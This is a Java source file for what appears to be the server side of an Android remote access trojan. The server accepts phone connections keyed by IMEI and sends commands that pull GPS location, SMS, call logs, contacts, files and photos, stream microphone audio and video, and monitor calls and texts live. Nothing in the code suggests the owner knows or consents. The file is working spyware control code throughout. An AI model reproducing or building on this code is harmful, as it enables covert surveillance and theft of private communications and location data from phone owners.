package server;

import gui.GUI;
import handler.AdvInfoHandler;
import handler.CallLogHandler;
import handler.CallMonitorHandler;
import handler.ChannelDistributionHandler;
import handler.ClientLogHandler;
import handler.ContactsHandler;
import handler.FileHandler;
import handler.FileTreeHandler;
import handler.GPSHandler;
import handler.PacketHandler;
import handler.PictureHandler;
import handler.PreferenceHandler;
import handler.SMSHandler;
import handler.SMSMonitorHandler;
import handler.SoundHandler;
import handler.VideoHandler;
import inout.Controler;
import inout.Protocol;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.HashMap;
import java.util.Scanner;

import javax.swing.UIManager;

import Packet.AdvancedInformationPacket;
import Packet.CallLogPacket;
import Packet.CallStatusPacket;
import Packet.CommandPacket;
import Packet.ContactsPacket;
import Packet.FilePacket;
import Packet.FileTreePacket;
import Packet.GPSPacket;
import Packet.LogPacket;
import Packet.Packet;
import Packet.PreferencePacket;
import Packet.RawPacket;
import Packet.SMSTreePacket;
import Packet.ShortSMSPacket;
import Packet.TransportPacket;

public class Server implements Controler {

	private ServerSocket serverSocket;
	private int serverPort;
	private boolean online = true;
	private int Nclient;
	private GUI gui;

	private HashMap<String, ClientHandler> clientMap;
	private HashMap<String, ChannelDistributionHandler> channelHandlerMap;

	public Server(int port) {
		if(port == 0) {
			try {
	            Scanner sc = new Scanner(new FileInputStream("config.txt"));
	            if(sc.hasNextInt()) port = sc.nextInt();
			} catch (Exception e) {
				port = 9999;
			}
		}
		
		Nclient = 0;
		serverPort = port;
		clientMap = new HashMap<String, ClientHandler>();
		channelHandlerMap = new HashMap<String, ChannelDistributionHandler>();

		gui = new GUI(this, serverPort);
		//gui.addUser("coucou", null, null, null, null, null, null);
		try {
			serverSocket = new ServerSocket(serverPort);
		} catch (IOException e) {
			e.printStackTrace();
		}

		setOnline();

	}
	
	public static void main(String[] args) {
		Server s = new Server(0);
	}
	
	public void savePortConfig(String newPort) {
		try {
			BufferedWriter bw = new BufferedWriter(new FileWriter(new File("config.txt"), false));
			bw.write(newPort);
			bw.close();
		} catch (FileNotFoundException e) {
			gui.logErrTxt("Can't find config.txt");
		} catch (IOException e) {
			gui.logErrTxt("Can't write the new port in config.txt");
		}
	}

	public void setOnline() {
		while (online) {
			gui.logTxt("SERVER online, awaiting for a client...");
			try {

				Socket cs = serverSocket.accept();

				// inscription temporaire d'un client connecte
				String id = Nclient + "client";
				ClientHandler newCH = new ClientHandler(cs, id, this, gui);
				clientMap.put(id, newCH);
				channelHandlerMap.put(id, new ChannelDistributionHandler());

				newCH.start();
				// System.out.println("client accept�");
				gui.logTxt("Connection established,temporary IMEI was assigned: " + id);

			} catch (IOException e) {
				// e.printStackTrace();
				gui.logErrTxt("ERROR while establishing a connection");
			}
		}
		
		gui.logTxt("*** SERVER STOPPED ***\n");
	}
	
	public void setOffline() {
		online = false;
	}


	public void Storage(TransportPacket p, String i) {
		int result = 0;
		int chan = p.getChannel();
		// System.out.println("PacketStorage recu sur le canal " + chan);
		//gui.logTxt("Receiving data from the channel: " + chan);

		if (!channelHandlerMap.containsKey(i)) {
			gui.logTxt("ERROR: received data is from an unknown client");
			return;
		} else if (channelHandlerMap.get(i).getPacketMap(chan) == null
				|| channelHandlerMap.get(i).getStorage(chan) == null) {

			gui.logErrTxt("ERROR: receiving data on an unregistered channel");
			return;
		} else
			result = channelHandlerMap.get(i).getStorage(chan).addPacket(p);

		if (result == Protocol.PACKET_LOST) {
			gui.logErrTxt("ERROR: one packet has been lost.");

		} else if (result == Protocol.NO_MORE) {
			gui.logErrTxt("ERROR: the final packet has already been received (no more packets awaited)");

		} else if (result == Protocol.SIZE_ERROR) {
			gui.logErrTxt("ERROR: the data cannot be completed, size error");
		} else if (result == Protocol.ALL_DONE) {
			//gui.logTxt("Transfer completed successfully!");
			dataHandlerStarter(chan, i);
		}

	}

	// la m�thode permettant de retrouver le DataHandler en question et de
	// lancer le traitement de la donn�e re�ue
	public void dataHandlerStarter(int channel, String imei) {

		if (channelHandlerMap.get(imei).getStorage(channel) == null
				|| channelHandlerMap.get(imei).getPacketMap(channel) == null
				|| channelHandlerMap.get(imei).getPacketHandlerMap(channel) == null)

		{
			gui.logErrTxt("ERROR: a handler class cannot be found for the used channel "
					+ channel);
			return;
		}

		byte[] final_data = channelHandlerMap.get(imei).getStorage(channel)
				.getFinalData();

		// r�cup�ration du packet
		Packet p = channelHandlerMap.get(imei).getPacketMap(channel);
		p.parse(final_data);

		// r�cup�ration du gestionnaire du packet
		PacketHandler handler = channelHandlerMap.get(imei).getPacketHandlerMap(channel);

		// lancement du traitement
		handler.handlePacket(p, imei, this);
	}

	/**
	 * Method that affect Handler & Packet to the right channel in the
	 * ChannelDistributionHandler It send the target channel, the command and
	 * the optionnal argument to the mux (then the client)
	 * 
	 * @param imei
	 *            Id of the client
	 * @param command
	 *            Flag command from Protocol class
	 * @param args
	 *            Optionnal arguments that completes the flag command
	 */
	public void commandSender(String imei, short command, byte[] args) {
		int channel;
		try {
			channel = channelHandlerMap.get(imei).getFreeChannel();
		} catch(NullPointerException e) {
			gui.logErrTxt("Client not available anymore. Cannot send command: "+command);
			return;
		}
			
		if (command == Protocol.GET_GPS_STREAM) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new GPSPacket()))
				gui.logErrTxt("ERREUR: The virtual channel " + channel + " already registered!");
			channelHandlerMap.get(imei).registerHandler(channel, new GPSHandler(channel, imei, gui));
			gui.saveMapChannel(imei, channel);
			
		} else if ((command == Protocol.GET_ADV_INFORMATIONS)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new AdvancedInformationPacket()))
				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
			channelHandlerMap.get(imei).registerHandler(channel, new AdvInfoHandler(channel, imei, gui));
			
		} else if ((command == Protocol.GET_PREFERENCE)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new PreferencePacket()))
				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
			channelHandlerMap.get(imei).registerHandler(channel, new PreferenceHandler(channel, imei, gui));
			
		} else if ((command == Protocol.GET_SOUND_STREAM)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new RawPacket()))
				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
			channelHandlerMap.get(imei).registerHandler(channel, new SoundHandler(channel, imei, gui));
			gui.saveSoundChannel(imei, channel);
			
		} else if ((command == Protocol.GET_PICTURE)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new RawPacket()))
				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
			channelHandlerMap.get(imei).registerHandler(channel, new PictureHandler(channel, imei, gui));
			gui.savePictureChannel(imei, channel);
			
		} else if ((command == Protocol.LIST_DIR)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new FileTreePacket()))
				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
			channelHandlerMap.get(imei).registerHandler(channel, new FileTreeHandler(channel, imei, gui));
			
		} else if ((command == Protocol.GET_CALL_LOGS)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new CallLogPacket()))
				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
			channelHandlerMap.get(imei).registerHandler(channel, new CallLogHandler(channel, imei, gui));
			gui.saveCallLogChannel(imei, channel);
			
		} else if ((command == Protocol.GET_SMS)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new SMSTreePacket()))
				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
			channelHandlerMap.get(imei).registerHandler(channel, new SMSHandler(channel, imei, gui));
			gui.saveSMSChannel(imei, channel);
			
		} else if ((command == Protocol.GET_CONTACTS)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new ContactsPacket()))
				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
			channelHandlerMap.get(imei).registerHandler(channel, new ContactsHandler(channel, imei, gui));
			gui.saveContactChannel(imei, channel);
			
		} else if ((command == Protocol.MONITOR_CALL)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new CallStatusPacket()))
				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
			channelHandlerMap.get(imei).registerHandler(channel, new CallMonitorHandler(channel, imei, gui));
			gui.saveMonitorCallChannel(imei, channel);
			
		} else if ((command == Protocol.MONITOR_SMS)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new ShortSMSPacket()))
				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
			channelHandlerMap.get(imei).registerHandler(channel, new SMSMonitorHandler(channel, imei, gui));
			gui.saveMonitorSMSChannel(imei, channel);
			
		} else if (command == Protocol.CONNECT) {
			channelHandlerMap.get(imei).registerListener(channel, new CommandPacket());
			channelHandlerMap.get(imei).registerListener(1, new LogPacket());
			channelHandlerMap.get(imei).registerHandler(1, new ClientLogHandler(channel, imei, gui));
		} 
		else if ((command == Protocol.GET_VIDEO_STREAM)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new RawPacket()))
				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
			channelHandlerMap.get(imei).registerHandler(channel, new VideoHandler(channel, imei, gui));
			gui.saveVideoChannel(imei, channel);
		}

		/*
		 * else if(command == Protocol.STOP_GPS_STREAM) { PacketHandler p = new
		 * CommandHandler();int c = 0; do { c++;
		 * if(channelHandlerMap.get(imei).getPacketHandlerMap(c) != null) p =
		 * channelHandlerMap.get(imei).getPacketHandlerMap(c); } while(!(p
		 * instanceof GPSPacket));
		 * channelHandlerMap.get(imei).removeListener(c); } else if(command ==
		 * Protocol.STOP_MONITOR_SMS) { PacketHandler p = new
		 * CommandHandler();int c = 0; do { c++;
		 * if(channelHandlerMap.get(imei).getPacketHandlerMap(c) != null) p =
		 * channelHandlerMap.get(imei).getPacketHandlerMap(c); } while(!(p
		 * instanceof SMSMonitorHandler));
		 * channelHandlerMap.get(imei).removeListener(c); } else if(command ==
		 * Protocol.STOP_SOUND_STREAM) { PacketHandler p = new
		 * CommandHandler();int c = 0; do { c++;
		 * if(channelHandlerMap.get(imei).getPacketHandlerMap(c) != null) p =
		 * channelHandlerMap.get(imei).getPacketHandlerMap(c); } while(!(p
		 * instanceof SoundHandler));
		 * channelHandlerMap.get(imei).removeListener(c); } else if(command ==
		 * Protocol.STOP_VIDEO_STREAM) { PacketHandler p = new
		 * CommandHandler();int c = 0; do { c++;
		 * if(channelHandlerMap.get(imei).getPacketHandlerMap(c) != null) p =
		 * channelHandlerMap.get(imei).getPacketHandlerMap(c); } while(!(p
		 * instanceof VideoHandler));
		 * channelHandlerMap.get(imei).removeListener(c); }
		 * 
		 * else if(command == Protocol.STOP_MONITOR_SMS) { PacketHandler p = new
		 * CommandHandler();int c = 0; do { c++;
		 * if(channelHandlerMap.get(imei).getPacketHandlerMap(c) != null) p =
		 * channelHandlerMap.get(imei).getPacketHandlerMap(c); } while(!(p
		 * instanceof SMSMonitorHandler));
		 * channelHandlerMap.get(imei).removeListener(c); } else if(command ==
		 * Protocol.STOP_MONITOR_CALL) { PacketHandler p = new
		 * CommandHandler();int c = 0; do { c++;
		 * if(channelHandlerMap.get(imei).getPacketHandlerMap(c) != null) p =
		 * channelHandlerMap.get(imei).getPacketHandlerMap(c); } while(!(p
		 * instanceof CallMonitorHandler));
		 * channelHandlerMap.get(imei).removeListener(c); }
		 */

		byte[] nullArgs = new byte[0];
		if (args == null)
			args = nullArgs;
		clientMap.get(imei).toMux(command, channel, args);
	}
	
	public void commandFileSender(String imei, short command, byte[] args, String dir, String name) {
		int channel = channelHandlerMap.get(imei).getFreeChannel();
		
		if (!channelHandlerMap.get(imei).registerListener(channel, new FilePacket())) 
			gui.logErrTxt("ERROR: channel " + channel+ " is already in use!");
		
		channelHandlerMap.get(imei).registerHandler(channel, new FileHandler(channel, imei, gui, dir, name));
		//gui.saveFileChannel(imei, channel);
		
		byte[] nullArgs = new byte[0];
		if (args == null) args = nullArgs;
		clientMap.get(imei).toMux(command, channel, args);
	}

	public void commandStopSender(String imei, short command, byte[] args,
			int channel) {

		channelHandlerMap.get(imei).removeListener(channel);

		byte[] nullArgs = new byte[0];
		if (args == null)
			args = nullArgs;
		clientMap.get(imei).toMux(command, channel, args);
	}
	
	public void DeleteClientHandler(String i)
	{
		if(clientMap.containsKey(i) && channelHandlerMap.containsKey(i))
			{
			   clientMap.remove(i);
			   channelHandlerMap.remove(i);
			   gui.deleteUser(i);
			   gui.logTxt("Client "+i+" has been deleted due to it's disonnection");
				
			}
		else
			gui.logErrTxt(i+"client's data couldnt't be deleted after it's disonnection");
	}

	public GUI getGui() {
		return gui;
	}

	public HashMap<String, ClientHandler> getClientMap() {
		return clientMap;
	}

	public HashMap<String, ChannelDistributionHandler> getChannelHandlerMap() {
		return channelHandlerMap;
	}
}
